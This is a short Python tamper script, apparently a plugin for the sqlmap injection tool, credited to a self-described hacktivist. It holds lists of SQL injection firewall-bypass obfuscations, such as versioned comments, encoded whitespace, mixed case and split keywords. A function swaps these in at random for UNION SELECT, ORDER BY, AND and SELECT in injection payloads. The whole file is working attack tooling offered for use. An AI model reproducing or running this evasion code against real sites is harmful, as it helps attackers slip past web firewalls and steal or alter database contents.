#!/usr/bin/env python
#coder by rootayyildiz turkish hacktivist
#github.com/darkscript1337
from lib.core.enums import PRIORITY
import random
import re

__priority__ = PRIORITY.LOW

#  Kullanılacak bypass teknikleri
BYPASS_TECHNIQUES_UNION_SELECT = [
    "/*!50000union+select*/",
    "/*!12345union+select*/",
    "/*!13337union+select*/",
    "unUNION/*&a=*/SELECTion/*&a=*/select",
    "/*/*/union/*/*/select/*/*/from/*/*/",
    "unIoN SeLect",
    "union%0d%0aselect%0d%0a",
    "union%a0select%a0",
    "union/**/select/**/",
    "union/**)*/select/**)*/",
    "union/*--*/select/*--*/",
    "/*!5000union*//*!5000select*/",
    "union all select",
    "union distinct select",
    "union distinctrow select"
]

BYPASS_TECHNIQUES_ORDER_BY = [
    "/*!50000order+by*/",
    "order/**/by",
    "orDEr/**/By",
    "ORDER%0d%0aby",
    "ORDER%a0by",
    "or/**/de/**/r/**/by",
    "/*/*/order/*/*/by"
]

BYPASS_TECHNIQUES_AND = [
    "/*!50000and*/",
    "and/**/",
    "AnD",
    "and%0d%0a",
    "and%a0",
    "a/**/nd",
    "/*/*/and"
]

BYPASS_TECHNIQUES_SELECT = [
    "/*!50000select*/",
    "SeLeCt",
    "select%0d%0a",
    "select%a0",
    "sel/**/ect",
    "/*/*/select",
    "select/**/"
]

def dependencies():
    pass

def tamper(payload, **kwargs):
    

    retVal = payload

    if payload:

        match_union_select = re.search(r"(?i)UNION\s+SELECT", payload)
        if match_union_select:
            technique_union_select = random.choice(BYPASS_TECHNIQUES_UNION_SELECT)
            retVal = re.sub(r"(?i)UNION\s+SELECT", technique_union_select, payload)

        match_order_by = re.search(r"(?i)ORDER\s+BY", retVal)
        if match_order_by:
            technique_order_by = random.choice(BYPASS_TECHNIQUES_ORDER_BY)
            retVal = re.sub(r"(?i)ORDER\s+BY", technique_order_by, retVal)

        match_and = re.search(r"(?i)\bAND\b", retVal)
        if match_and:
            technique_and = random.choice(BYPASS_TECHNIQUES_AND)
            retVal = re.sub(r"(?i)\bAND\b", technique_and, retVal)

        match_select = re.search(r"(?i)\bSELECT\b", retVal)
        if match_select:
            technique_select = random.choice(BYPASS_TECHNIQUES_SELECT)
            retVal = re.sub(r"(?i)\bSELECT\b", technique_select, retVal)

    return retVal
